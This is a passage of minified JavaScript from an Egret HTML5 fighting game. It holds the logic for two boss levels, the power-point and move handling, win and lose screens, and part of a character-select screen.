        5 >= b ? (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(),
            this.outcome_2()) : (this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play(), this.outcome_3())
    };
    d.prototype.four = function (b) {
        3 >= b ? (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(), this.outcome_2()) : 7 >= b ? 0 > this.Ai_power() - 1 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("Qigong"),
            this.Ai_player.play(), this.outcome_1()) : (this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play(), this.outcome_3())
    };
    d.prototype.five = function (b) {
        2 >= b ? 0 > this.Ai_power() - 3 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 3 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("black_dragon"), this.Ai_player.play(), this.outcome_4()) : 5 >= b ? (this.Ai_player.movieClipData =
            this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(), this.outcome_2()) : 7 >= b ? 0 > this.Ai_power() - 1 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("Qigong"), this.Ai_player.play(), this.outcome_1()) : (this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play(), this.outcome_3())
    };
    d.prototype.sixth =
        function (b) {
            2 >= b ? 0 > this.Ai_power() - 4 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 4 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("sickle"), this.Ai_player.play(), this.outcome_5()) : 5 >= b ? 0 > this.Ai_power() - 3 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 3 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("black_dragon"), this.Ai_player.play(), this.outcome_4()) : 7 >= b ? 0 > this.Ai_power() -
            1 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("Qigong"), this.Ai_player.play(), this.outcome_1()) : (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(), this.outcome_2())
        };
    d.prototype.another = function (b) {
        1 >= b ? 0 > this.Ai_power() - 5 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 5 + "", this.Ai_player.movieClipData =
            this.AiFactory.generateMovieClipData("mine"), this.Ai_player.play(), this.outcome_6()) : 3 >= b ? 0 > this.Ai_power() - 3 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 3 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("black_dragon"), this.Ai_player.play(), this.outcome_4()) : 5 >= b ? 0 > this.Ai_power() - 4 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 4 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("sickle"),
            this.Ai_player.play(), this.outcome_5()) : 7 >= b ? (this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play(), this.outcome_3()) : 8 == b ? (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(), this.outcome_2()) : 0 > this.Ai_power() - 1 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("senior_block"),
            this.Ai_player.play(), this.outcome_7)
    };
    d.prototype.loser = function () {
        var b = this;
        Main.fuckyou = 3;
        egret.Tween.get(this).wait(1E3).call(function () {
            b.prompt.text = "\u60a8\u5931\u8d25\u4e86...";
            for (var a = 0; 8 > a; a++)b.skill_arr[a].touchEnabled = !0;
            egret.Tween.get(b).wait(1E3).call(function () {
                b.removeChildren();
                var a = new Over("fail");
                b.addChild(a)
            })
        })
    };
    d.prototype.winner = function () {
        var b = this;
        Main.fuckyou = 4;
        egret.Tween.get(this).wait(1E3).call(function () {
            b.prompt.text = "\u60a8\u6218\u80dc\u4e86\u5bf9\u624b...";
            for (var a = 0; 8 > a; a++)b.skill_arr[a].touchEnabled = !0;
            egret.Tween.get(b).wait(1E3).call(function () {
                b.removeChildren();
                var a = new Over("success");
                b.addChild(a);
                ih5game.storage.get("fiveAi") || ih5game.storage.set("fiveAi", "true")
            })
        })
    };
    d.prototype.onEnterFrame = function () {
        var b = this;
        if (this.second_bout && this.second_Tap) {
            this.second_Tap = this.second_bout = !1;
            var a = Common.c_random(0, 10);
            this.getProbability(a, this.symbol);
            this.symbol++;
            egret.Tween.get(this).wait(1500).call(function () {
                b.Ai_player.movieClipData =
                    b.AiFactory.generateMovieClipData("stand");
                b.Ai_player.play()
            })
        }
    };
    d.prototype.log = function () {
        var b = this;
        this.prompt.visible || (this.prompt.visible = !0);
        this.prompt.text = "Power\u4e0d\u8db3...";
        egret.Tween.get(this.prompt).wait(500).call(function () {
            b.prompt.text = "\u8bf7\u9009\u62e9\u62db\u5f0f...";
            for (var a = 0; 8 > a; a++)b.skill_arr[a].touchEnabled = !0;
            b.global_bout = !0;
            b.player.movieClipData = b.mcFactory.generateMovieClipData("stand");
            b.player.play();
            b.Ai_player.movieClipData = b.AiFactory.generateMovieClipData("stand");
            b.Ai_player.play();
            b.storage_Bool = !1;
            b.base_block_Bool = !1;
            b.senior_block_Bool = !1;
            b.qi_gong_Bool = !1;
            b.black_dragon_Bool = !1;
            b.sickle_Bool = !1;
            b.thunder_Bool = !1;
            b.vigour_Bool = !1
        })
    };
    d.prototype.triggerBaseBlock = function () {
        var b = this;
        this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u57fa\u7840\u683c\u6321...";
        this.player.movieClipData = this.mcFactory.generateMovieClipData("base_block");
        this.player.play();
        this.first_bout ? (this.first_bout = !1, this.sign = 1, this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData =
            this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play()) : this.second_bout || (this.second_bout = !0);
        egret.Tween.get(this.prompt).wait(1500).call(function () {
            b.backToStand();
            1 != b.sign || b.second_bout || (b.second_bout = !0)
        })
    };
    d.prototype.backToStand = function () {
        for (var b = this, a = 0; 8 > a; a++)this.skill_arr[a].touchEnabled = !0;
        this.vigour_Bool = this.thunder_Bool = this.sickle_Bool = this.black_dragon_Bool = this.qi_gong_Bool = this.senior_block_Bool = this.base_block_Bool = this.storage_Bool = !1;
        this.global_bout = !0;
        this.player.movieClipData = this.mcFactory.generateMovieClipData("stand");
        this.player.play();
        this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("stand");
        this.Ai_player.play();
        egret.Tween.get(this).wait(500).call(function () {
            b.prompt.text = "\u8bf7\u9009\u62e9\u62db\u5f0f..."
        })
    };
    d.prototype.judge = function () {
        this.first_bout || this.second_bout || (this.second_bout = !0)
    };
    d.prototype.addPower = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.storage_Bool = !0;
        this.global_bout &&
        (this.prompt.visible || (this.prompt.visible = !0), this.global_bout = !1, this.prompt.text = "\u50a8\u5b58\u80fd\u91cf\u4e2d...", this.power_point_l.text = this.player_power() + 1 + "", this.player.movieClipData = this.mcFactory.generateMovieClipData("storage"), this.player.play(), this.first_bout ? (this.first_bout = !1, this.sign = 1, this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play()) : (this.second_bout || (this.second_bout = !0), this.second_bout &&
        (this.second_Tap = !0)), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.global_bout = !0;
            a.backToStand();
            1 != a.sign || a.second_bout || (a.second_bout = !0)
        }))
    };
    d.prototype.base_block = function (b) {
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.base_block_Bool = !0;
        this.judge();
        this.second_bout && (this.second_Tap = !0);
        this.global_bout && (this.global_bout = !1, this.triggerBaseBlock())
    };
    d.prototype.senior_block = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.senior_block_Bool = !0;
        this.judge();
        1 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_senior = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u9ad8\u7ea7\u683c\u6321...", this.power_point_l.text = this.minus(1), this.player.movieClipData = this.mcFactory.generateMovieClipData("senior_block"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_senior = !1, this.log())
    };
    d.prototype.QiGong = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.qi_gong_Bool = !0;
        this.judge();
        1 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_qiQ = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u6c14\u529f\u6ce2...", this.power_point_l.text = this.minus(1), this.player.movieClipData = this.mcFactory.generateMovieClipData("Qigong"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_qiQ = !1, this.log())
    };
    d.prototype.black_dragon = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.black_dragon_Bool = !0;
        this.judge();
        3 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_blackDragon = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u9ed1\u9f99\u529f...", this.power_point_l.text = this.minus(3), this.player.movieClipData = this.mcFactory.generateMovieClipData("black_dragon"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_blackDragon = !1, this.log())
    };
    d.prototype.sickle = function (b) {
        var a = this;
        for (b = 0; 8 >
        b; b++)this.skill_arr[b].touchEnabled = !1;
        this.sickle_Bool = !0;
        this.judge();
        4 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_sickle = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u9570\u5200\u65a9...", this.power_point_l.text = this.minus(4), this.player.movieClipData = this.mcFactory.generateMovieClipData("sickle"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_sickle = !1, this.log())
    };
    d.prototype.thunder = function (b) {
        var a =
            this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.thunder_Bool = !0;
        this.judge();
        5 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_thunder = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u96f7\u5f39...", this.power_point_l.text = this.minus(5), this.player.movieClipData = this.mcFactory.generateMovieClipData("mine"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_thunder = this.second_Tap = !1, this.log())
    };
    d.prototype.vigour =
        function (b) {
            var a = this;
            for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
            this.vigour_Bool = !0;
            this.judge();
            8 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_vigour = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u5143\u6c14\u5f39...", this.power_point_l.text = this.minus(8), this.player.movieClipData = this.mcFactory.generateMovieClipData("vigour"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
                a.backToStand()
            })) : (this.enough_vigour = !1, this.log())
        };
    d.prototype.player_power =
        function () {
            return parseInt(this.power_point_l.text)
        };
    d.prototype.Ai_power = function () {
        return parseInt(this.power_point_r.text)
    };
    d.prototype.minus = function (b) {
        return parseInt(this.power_point_l.text) - b + ""
    };
    return d
}(Game);
Login_4.prototype.__class__ = "Login_4";
var __extends = this.__extends || function (c, d) {
        function b() {
            this.constructor = c
        }

        for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
        b.prototype = d.prototype;
        c.prototype = new b
    }, Login_5 = function (c) {
    function d() {
        c.call(this);
        this.first_bout = this.global_bout = !0;
        this.second_bout = !1;
        this.sign = 0;
        this.second_Tap = this.enough_vigour = this.enough_thunder = this.enough_sickle = this.enough_blackDragon = this.enough_qiQ = this.enough_senior = this.vigour_Bool = this.thunder_Bool = this.sickle_Bool = this.black_dragon_Bool = this.qi_gong_Bool =
            this.senior_block_Bool = this.base_block_Bool = this.storage_Bool = !1;
        this.symbol = 2;
        this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onLoadStage, this)
    }

    __extends(d, c);
    d.prototype.onLoadStage = function () {
        this.removeEventListener(egret.Event.ADDED_TO_STAGE, this.onLoadStage, this);
        var b = RES.getRes("player_json"), a = RES.getRes("player_png");
        this.mcFactory = new egret.MovieClipDataFactory(b, a);
        this.player = new egret.MovieClip(this.mcFactory.generateMovieClipData("stand"));
        this.player.x = 20 * Main.sFactor + this.player.width /
        2 * Main.sFactor;
        this.player.y = 538 * Main.sFactor + this.player.height / 2 * Main.sFactor;
        this.player.scaleX = this.player.scaleY = Main.sFactor;
        b = RES.getRes("boss_5_json");
        a = RES.getRes("boss_5_png");
        this.AiFactory = new egret.MovieClipDataFactory(b, a);
        this.Ai_player = new egret.MovieClip(this.AiFactory.generateMovieClipData("stand"));
        this.Ai_player.x = 0.88 * Main.stageW;
        this.Ai_player.y = 538 * Main.sFactor + this.Ai_player.height / 2 * Main.sFactor;
        this.Ai_player.scaleX = this.Ai_player.scaleY = Main.sFactor;
        this.addChild(this.Ai_player);
        this.addChild(this.player);
        this.prompt = new Prompt;
        this.addChild(this.prompt);
        this.stage.addEventListener(egret.Event.ENTER_FRAME, this.onEnterFrame, this)
    };
    d.prototype.getProbability = function (b, a) {
        switch (a) {
            default:
                this.another(b)
        }
    };
    d.prototype.outcome_1 = function () {
        this.base_block_Bool || this.qi_gong_Bool || (this.storage_Bool ? this.loser() : this.senior_block_Bool ? this.enough_senior && this.loser() : this.sickle_Bool ? this.enough_sickle && this.winner() : this.vigour_Bool ? this.enough_vigour && this.winner() : this.thunder_Bool ?
        this.enough_thunder && this.winner() : this.black_dragon_Bool && this.enough_blackDragon && this.winner())
    };
    d.prototype.outcome_2 = function () {
        this.base_block_Bool || this.qi_gong_Bool || this.storage_Bool || this.senior_block_Bool || (this.sickle_Bool ? this.enough_sickle && this.winner() : this.vigour_Bool ? this.enough_vigour && this.winner() : this.thunder_Bool ? this.enough_thunder && this.winner() : this.black_dragon_Bool && this.enough_blackDragon && this.winner())
    };
    d.prototype.outcome_3 = function () {
        this.base_block_Bool || (this.qi_gong_Bool ?
        this.enough_qiQ && this.winner() : this.storage_Bool || this.senior_block_Bool || (this.sickle_Bool ? this.enough_sickle && this.winner() : this.vigour_Bool ? this.enough_vigour && this.winner() : this.thunder_Bool ? this.enough_thunder && this.winner() : this.black_dragon_Bool && this.enough_blackDragon && this.winner()))
    };
    d.prototype.outcome_7 = function () {
        this.base_block_Bool || (this.qi_gong_Bool ? this.enough_qiQ && this.winner() : this.storage_Bool || this.senior_block_Bool || this.sickle_Bool || this.vigour_Bool && this.enough_vigour && this.winner())
    };
    d.prototype.allot = function () {
        Common.c_random(0, 2) ? this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block") : (this.power_point_r.text = this.player_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"));
        this.Ai_player.play()
    };
    d.prototype.another = function (b) {
        this.storage_Bool && (8 >= b ? 0 > this.Ai_power() - 1 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("Qigong"),
            this.Ai_player.play(), this.outcome_1()) : (this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play(), this.outcome_3()));
        if (this.base_block_Bool || this.senior_block_Bool)8 >= b ? (this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play(), this.outcome_3()) : (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"),
            this.Ai_player.play(), this.outcome_2());
        this.qi_gong_Bool && (8 >= b ? (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(), this.outcome_2()) : 0 > this.Ai_power() - 1 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("Qigong"), this.Ai_player.play(), this.outcome_1));
        if (this.sickle_Bool || this.thunder_Bool || this.black_dragon_Bool)8 >= b ? 0 > this.Ai_power() - 1 ? (this.power_point_r.text =
            "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("senior_block"), this.Ai_player.play(), this.outcome_7) : (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(), this.outcome_2());
        this.vigour_Bool && (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(), this.outcome_2())
    };
    d.prototype.loser = function () {
        var b = this;
        Main.fuckyou = 4;
        egret.Tween.get(this).wait(1E3).call(function () {
            b.prompt.text =
                "\u60a8\u5931\u8d25\u4e86...";
            for (var a = 0; 8 > a; a++)b.skill_arr[a].touchEnabled = !0;
            egret.Tween.get(b).wait(1E3).call(function () {
                b.removeChildren();
                var a = new Over("fail");
                b.addChild(a)
            })
        })
    };
    d.prototype.winner = function () {
        var b = this;
        Main.fuckyou = 5;
        egret.Tween.get(this).wait(1E3).call(function () {
            b.prompt.text = "\u60a8\u6218\u80dc\u4e86\u5bf9\u624b...";
            for (var a = 0; 8 > a; a++)b.skill_arr[a].touchEnabled = !0;
            egret.Tween.get(b).wait(1E3).call(function () {
                b.removeChildren();
                var a = new Over("success");
                b.addChild(a)
            })
        })
    };
    d.prototype.onEnterFrame = function () {
        var b = this;
        if (this.second_bout && this.second_Tap) {
            this.second_Tap = this.second_bout = !1;
            var a = Common.c_random(0, 10);
            this.getProbability(a, this.symbol);
            this.symbol++;
            egret.Tween.get(this).wait(1500).call(function () {
                b.Ai_player.movieClipData = b.AiFactory.generateMovieClipData("stand");
                b.Ai_player.play()
            })
        }
    };
    d.prototype.log = function () {
        var b = this;
        this.prompt.visible || (this.prompt.visible = !0);
        this.prompt.text = "Power\u4e0d\u8db3...";
        egret.Tween.get(this.prompt).wait(500).call(function () {
            b.prompt.text =
                "\u8bf7\u9009\u62e9\u62db\u5f0f...";
            for (var a = 0; 8 > a; a++)b.skill_arr[a].touchEnabled = !0;
            b.global_bout = !0;
            b.player.movieClipData = b.mcFactory.generateMovieClipData("stand");
            b.player.play();
            b.Ai_player.movieClipData = b.AiFactory.generateMovieClipData("stand");
            b.Ai_player.play();
            b.storage_Bool = !1;
            b.base_block_Bool = !1;
            b.senior_block_Bool = !1;
            b.qi_gong_Bool = !1;
            b.black_dragon_Bool = !1;
            b.sickle_Bool = !1;
            b.thunder_Bool = !1;
            b.vigour_Bool = !1
        })
    };
    d.prototype.triggerBaseBlock = function () {
        var b = this;
        this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u57fa\u7840\u683c\u6321...";
        this.player.movieClipData = this.mcFactory.generateMovieClipData("base_block");
        this.player.play();
        this.first_bout ? (this.first_bout = !1, this.sign = 1, this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play()) : this.second_bout || (this.second_bout = !0);
        egret.Tween.get(this.prompt).wait(1500).call(function () {
            b.backToStand();
            1 != b.sign || b.second_bout || (b.second_bout = !0)
        })
    };
    d.prototype.backToStand = function () {
        for (var b = this, a =
            0; 8 > a; a++)this.skill_arr[a].touchEnabled = !0;
        this.vigour_Bool = this.thunder_Bool = this.sickle_Bool = this.black_dragon_Bool = this.qi_gong_Bool = this.senior_block_Bool = this.base_block_Bool = this.storage_Bool = !1;
        this.global_bout = !0;
        this.player.movieClipData = this.mcFactory.generateMovieClipData("stand");
        this.player.play();
        this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("stand");
        this.Ai_player.play();
        egret.Tween.get(this).wait(500).call(function () {
            b.prompt.text = "\u8bf7\u9009\u62e9\u62db\u5f0f..."
        })
    };
    d.prototype.judge = function () {
        this.first_bout || this.second_bout || (this.second_bout = !0)
    };
    d.prototype.addPower = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.storage_Bool = !0;
        this.global_bout && (this.prompt.visible || (this.prompt.visible = !0), this.global_bout = !1, this.prompt.text = "\u50a8\u5b58\u80fd\u91cf\u4e2d...", this.power_point_l.text = this.player_power() + 1 + "", this.player.movieClipData = this.mcFactory.generateMovieClipData("storage"), this.player.play(), this.first_bout ? (this.first_bout = !1, this.sign = 1, this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play()) : (this.second_bout || (this.second_bout = !0), this.second_bout && (this.second_Tap = !0)), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.global_bout = !0;
            a.backToStand();
            1 != a.sign || a.second_bout || (a.second_bout = !0)
        }))
    };
    d.prototype.base_block = function (b) {
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.base_block_Bool = !0;
        this.judge();
        this.second_bout && (this.second_Tap = !0);
        this.global_bout && (this.global_bout = !1, this.triggerBaseBlock())
    };
    d.prototype.senior_block = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.senior_block_Bool = !0;
        this.judge();
        1 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_senior = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u9ad8\u7ea7\u683c\u6321...", this.power_point_l.text = this.minus(1), this.player.movieClipData = this.mcFactory.generateMovieClipData("senior_block"),
            this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_senior = !1, this.log())
    };
    d.prototype.QiGong = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.qi_gong_Bool = !0;
        this.judge();
        1 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_qiQ = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u6c14\u529f\u6ce2...", this.power_point_l.text = this.minus(1), this.player.movieClipData = this.mcFactory.generateMovieClipData("Qigong"),
            this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_qiQ = !1, this.log())
    };
    d.prototype.black_dragon = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.black_dragon_Bool = !0;
        this.judge();
        3 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_blackDragon = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u9ed1\u9f99\u529f...", this.power_point_l.text = this.minus(3), this.player.movieClipData = this.mcFactory.generateMovieClipData("black_dragon"),
            this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_blackDragon = !1, this.log())
    };
    d.prototype.sickle = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.sickle_Bool = !0;
        this.judge();
        4 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_sickle = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u9570\u5200\u65a9...", this.power_point_l.text = this.minus(4), this.player.movieClipData = this.mcFactory.generateMovieClipData("sickle"),
            this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_sickle = !1, this.log())
    };
    d.prototype.thunder = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.thunder_Bool = !0;
        this.judge();
        5 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_thunder = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u96f7\u5f39...", this.power_point_l.text = this.minus(5), this.player.movieClipData = this.mcFactory.generateMovieClipData("mine"),
            this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_thunder = this.second_Tap = !1, this.log())
    };
    d.prototype.vigour = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.vigour_Bool = !0;
        this.judge();
        8 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_vigour = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u5143\u6c14\u5f39...", this.power_point_l.text = this.minus(8), this.player.movieClipData = this.mcFactory.generateMovieClipData("vigour"),
            this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_vigour = !1, this.log())
    };
    d.prototype.player_power = function () {
        return parseInt(this.power_point_l.text)
    };
    d.prototype.Ai_power = function () {
        return parseInt(this.power_point_r.text)
    };
    d.prototype.minus = function (b) {
        return parseInt(this.power_point_l.text) - b + ""
    };
    return d
}(Game);
Login_5.prototype.__class__ = "Login_5";
var __extends = this.__extends || function (c, d) {
        function b() {
            this.constructor = c
        }

        for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
        b.prototype = d.prototype;
        c.prototype = new b
    }, Select = function (c) {
    function d() {
        c.call(this);
        this.people_arr = [];
        this.people_x = [];
        this.people_y = [];
        this.people_name = [];
        this.people_arr = ["ka1", "ka2", "ka3", "ka4", "ka5"];
        this.people_x = [34, 204, 374, 113, 285];
        this.people_y = [30, 30, 30, 236, 236];
        this.people_name = ["\u5c0f\u5446", "\u9886\u73ed\u5c0f\u7ec4\u957f", "\u82f1\u8bed\u8bfe\u4ee3\u8868", "\u4f53\u80b2\u59d4\u5458",
            "\u9648\u5c0f\u7f8e"];
        var b = Common.c_door_bg();
        this.addChild(b);
        b = Common.c_mask();
        this.addChild(b);
        b = Common.c_back();
        b.y = 64 * Main.sFactor;
        b.x = 0.903 * Main.stageW - b.width;
        b.touchEnabled = !0;
        b.addEventListener(egret.TouchEvent.TOUCH_BEGIN, this.back_home, this);
        this.addChild(b);
        b = new egret.Sprite;
        b.width = 540 * Main.sFactor;
        b.height = 432 * Main.sFactor;
        b.y = 338 * Main.sFactor;
        b.x = Main.stageW / 2 - b.width / 2;
        var a = new egret.Shape;
        a.graphics.beginFill(16777215, 0.8);
        a.graphics.drawRoundRect(0, 0, b.width, b.height, 20);
        a.graphics.endFill();
        b.addChild(a);
        this.addChild(b);
        for (a = 0; 5 > a; a++) {
            var d = this.iterates(a, this.people_x[a], this.people_y[a]);
            b.addChild(d)
        }
    }

    __extends(d, c);
    d.prototype.back_home = function (b) {
        b = b._currentTarget;
        b.touchEnabled = !1;
        b.removeEventListener(egret.TouchEvent.TOUCH_BEGIN, this.back_home, this);
        this.removeChildren();
        b = new Start;
        this.addChild(b)
    };
    d.prototype.iterates = function (b, a, c) {
        var d = new egret.Sprite;
        d.width = 130 * Main.sFactor;
        d.height = 165 * Main.sFactor;
        var n = new egret.Bitmap;
        n.texture = RES.getRes(this.people_arr[b]);
        if (0 < b)switch (b) {
            case 1:
                ih5game.storage.get("secondAi") ? (n.alpha = 1, n.touchEnabled = !0, n.addEventListener(egret.TouchEvent.TOUCH_BEGIN, this.in_second_game, this)) : (n.alpha = 0.5, n.touchEnabled = !1);
                break;
            case 2:
                ih5game.storage.get("threeAi") ? (n.alpha = 1, n.touchEnabled = !0, n.addEventListener(egret.TouchEvent.TOUCH_BEGIN, this.in_three_game, this)) : (n.alpha = 0.5, n.touchEnabled = !1);
                break;
            case 3:
                ih5game.storage.get("fourAi") ? (n.alpha = 1, n.touchEnabled = !0, n.addEventListener(egret.TouchEvent.TOUCH_BEGIN,
                    this.in_four_game, this)) : (n.alpha = 0.5, n.touchEnabled = !1);
                break;
            case 4:
                ih5game.storage.get("fiveAi") ? (n.alpha = 1, n.touchEnabled = !0, n.addEventListener(egret.TouchEvent.TOUCH_BEGIN, this.in_five_game, this)) : (n.alpha = 0.5, n.touchEnabled = !1)
        } else n.touchEnabled = !0, n.addEventListener(egret.TouchEvent.TOUCH_BEGIN, this.in_one_game, this);
        d.addChild(n);
        n = new egret.TextField;
        n.text = this.people_name[b];
        n.fontFamily = "\u5fae\u8f6f\u96c5\u9ed1";
        n.size = 20 * Main.sFactor;
        n.textColor = 3355443;
        n.width = 130 * Main.sFactor;
        n.textAlign = "center";
        n.y = 144 * Main.sFactor;
        d.addChild(n);
        d.x = a * Main.sFactor;
        d.y = c * Main.sFactor;
        return d
    };
    d.prototype.in_one_game = function () {
        this.removeChildren();
        var b = new Login;
        this.addChild(b);
        window.cb_start();
    };
    d.prototype.in_second_game = function () {
        this.removeChildren();
